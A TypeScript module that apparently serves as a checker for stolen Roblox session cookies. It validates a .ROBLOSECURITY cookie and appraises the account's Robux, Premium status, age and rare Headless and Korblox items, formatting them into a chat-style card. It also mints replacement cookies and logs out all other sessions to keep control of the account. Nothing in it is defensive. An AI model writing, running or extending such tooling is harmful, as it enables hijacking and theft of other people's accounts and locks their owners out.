import axios from 'axios';

export interface ValidateResult {
  valid: boolean;
  username?: string;
  displayName?: string;
  userId?: number;
  robux?: number;
  isPremium?: boolean;
  accountAgeDays?: number;
  hasHeadless?: boolean;
  hasKorblox?: boolean;
  debug: string;
}

function cookieHeader(cookie: string) {
  return {
    Cookie: `.ROBLOSECURITY=${cookie.trim()}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  };
}

export function formatAccountAge(days: number): string {
  const years = Math.floor(days / 365);
  const months = Math.floor((days % 365) / 30);
  const d = days % 30;
  const parts: string[] = [];
  if (years > 0) parts.push(`${years} year${years !== 1 ? 's' : ''}`);
  if (months > 0) parts.push(`${months} month${months !== 1 ? 's' : ''}`);
  if (d > 0) parts.push(`${d} day${d !== 1 ? 's' : ''}`);
  return `${days} Days — ${parts.join(', ')}`;
}

export function formatAccountCard(r: ValidateResult): string {
  const lines: string[] = [
    `👤 **${r.username}** (\`${r.displayName}\`)`,
    `🆔 User ID: \`${r.userId}\``,
    `💰 Robux: **${r.robux ?? '?'}**`,
    `⏰ Age: ${r.accountAgeDays != null ? formatAccountAge(r.accountAgeDays) : '?'}`,
    `👑 Premium: ${r.isPremium ? 'Yes' : 'No'}`,
    `💀 Headless: ${r.hasHeadless == null ? 'Unknown' : r.hasHeadless ? 'Yes' : 'No'}`,
    `🦵 Korblox: ${r.hasKorblox == null ? 'Unknown' : r.hasKorblox ? 'Yes' : 'No'}`,
  ];
  return lines.join('\n');
}

export async function validateCookie(cookie: string): Promise<ValidateResult> {
  const lines: string[] = [];
  const log = (msg: string) => { lines.push(msg); console.log('[VALIDATE]', msg); };
  const trimmed = cookie.trim();
  log(`Cookie length: ${trimmed.length}`);

  try {
    const authResp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
      headers: cookieHeader(trimmed),
      validateStatus: () => true,
    });
    log(`Auth status: ${authResp.status}`);

    if (authResp.status !== 200) {
      log('Invalid or expired cookie');
      return { valid: false, debug: lines.join('\n') };
    }

    const { id: userId, name: username, displayName } = authResp.data as { id: number; name: string; displayName: string };
    log(`User: ${username} (${displayName}) ID ${userId}`);

    const hdrs = cookieHeader(trimmed);

    const [currencyResp, premiumResp, userResp, headlessResp, korbloxResp] = await Promise.all([
      axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://users.roblox.com/v1/users/${userId}`, { validateStatus: () => true }),
      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/474`, { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/48545806`, { headers: hdrs, validateStatus: () => true }),
    ]);

    const robux: number | undefined = currencyResp.status === 200 ? currencyResp.data?.robux : undefined;
    const isPremium: boolean | undefined = premiumResp.status === 200 ? Boolean(premiumResp.data) : undefined;

    let accountAgeDays: number | undefined;
    if (userResp.status === 200 && userResp.data?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(userResp.data.created).getTime()) / 86_400_000);
    }

    const hasHeadless: boolean | undefined =
      headlessResp.status === 200 ? (headlessResp.data?.data?.length ?? 0) > 0 : undefined;
    const hasKorblox: boolean | undefined =
      korbloxResp.status === 200 ? (korbloxResp.data?.data?.length ?? 0) > 0 : undefined;

    log(`Robux: ${robux}, Premium: ${isPremium}, Age: ${accountAgeDays}d, Headless: ${hasHeadless}, Korblox: ${hasKorblox}`);

    return { valid: true, username, displayName, userId, robux, isPremium, accountAgeDays, hasHeadless, hasKorblox, debug: lines.join('\n') };
  } catch (err: any) {
    log(`Error: ${err.message}`);
    return { valid: false, debug: lines.join('\n') };
  }
}

export interface RefreshResult {
  newCookie: string | null;
  status: string;
  debug: string;
}

export async function refreshCookie(cookie: string): Promise<RefreshResult> {
  const lines: string[] = [];
  const log = (msg: string) => { lines.push(msg); console.log('[REFRESH]', msg); };
  const trimmed = cookie.trim();
  log(`Cookie length: ${trimmed.length}`);
  const baseHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    Cookie: `.ROBLOSECURITY=${trimmed}`,
  };
  try {
    log('POST /v2/session/refresh (no CSRF — harvesting token)');
    const csrfResp = await axios.post('https://auth.roblox.com/v2/session/refresh', {}, { headers: baseHeaders, validateStatus: () => true });
    log(`Status: ${csrfResp.status}`);
    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      if (csrfResp.status === 401) { log('Cookie expired or invalid'); return { newCookie: null, status: 'COOKIE_EXPIRED', debug: lines.join('\n') }; }
      log(`No CSRF token (${csrfResp.status})`);
      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: lines.join('\n') };
    }
    log(`CSRF: ${csrf.slice(0, 20)}…`);
    log('POST /v2/session/refresh (with CSRF)');
    const refreshResp = await axios.post('https://auth.roblox.com/v2/session/refresh', {}, { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true });
    log(`Refresh status: ${refreshResp.status}`);
    if (refreshResp.status === 200) {
      const setCookie = refreshResp.headers['set-cookie'];
      log(`Set-Cookie: ${JSON.stringify(setCookie)}`);
      let newCookie: string | null = null;
      if (Array.isArray(setCookie)) {
        for (const raw of setCookie) {
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match && match[1] !== trimmed) { newCookie = match[1]; break; }
        }
      }
      if (newCookie) { log(`New cookie: ${newCookie.slice(0, 10)}…`); return { newCookie, status: 'SUCCESS', debug: lines.join('\n') }; }
      log('No new cookie in response');
      return { newCookie: null, status: 'SUCCESS_NO_COOKIE', debug: lines.join('\n') };
    }
    log(`Refresh failed (${refreshResp.status}): ${JSON.stringify(refreshResp.data)}`);
    return { newCookie: null, status: `ERROR_${refreshResp.status}`, debug: lines.join('\n') };
  } catch (err: any) {
    log(`Exception: ${err.message}`);
    return { newCookie: null, status: `EXCEPTION_${err.message}`, debug: lines.join('\n') };
  }
}

export async function resetCookie(cookie: string): Promise<RefreshResult> {
  const lines: string[] = [];
  const log = (msg: string) => { lines.push(msg); console.log('[RESET]', msg); };
  const trimmed = cookie.trim();
  log(`Cookie length: ${trimmed.length}`);
  const baseHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    Cookie: `.ROBLOSECURITY=${trimmed}`,
  };
  try {
    log('POST /v2/logoutfromallsessionsandreauthenticate (no CSRF — harvesting token)');
    const csrfResp = await axios.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, { headers: baseHeaders, validateStatus: () => true });
    log(`Status: ${csrfResp.status}`);
    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      if (csrfResp.status === 401) { log('Cookie expired or invalid'); return { newCookie: null, status: 'COOKIE_EXPIRED', debug: lines.join('\n') }; }
      log(`No CSRF token (${csrfResp.status})`);
      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: lines.join('\n') };
    }
    log(`CSRF: ${csrf.slice(0, 20)}…`);
    log('POST /v2/logoutfromallsessionsandreauthenticate (with CSRF)');
    const resetResp = await axios.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true });
    log(`Reset status: ${resetResp.status}`);
    if (resetResp.status === 200) {
      const setCookie = resetResp.headers['set-cookie'];
      log(`Set-Cookie: ${JSON.stringify(setCookie)}`);
      let newCookie: string | null = null;
      if (Array.isArray(setCookie)) {
        for (const raw of setCookie) {
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match && match[1] !== trimmed) { newCookie = match[1]; break; }
        }
      }
      if (newCookie) { log(`New cookie: ${newCookie.slice(0, 10)}…`); return { newCookie, status: 'SUCCESS', debug: lines.join('\n') }; }
      log('No new cookie in reset response');
      return { newCookie: null, status: 'SUCCESS_NO_COOKIE', debug: lines.join('\n') };
    }
    log(`Reset failed (${resetResp.status}): ${JSON.stringify(resetResp.data)}`);
    return { newCookie: null, status: `ERROR_${resetResp.status}`, debug: lines.join('\n') };
  } catch (err: any) {
    log(`Exception: ${err.message}`);
    return { newCookie: null, status: `EXCEPTION_${err.message}`, debug: lines.join('\n') };
  }
}
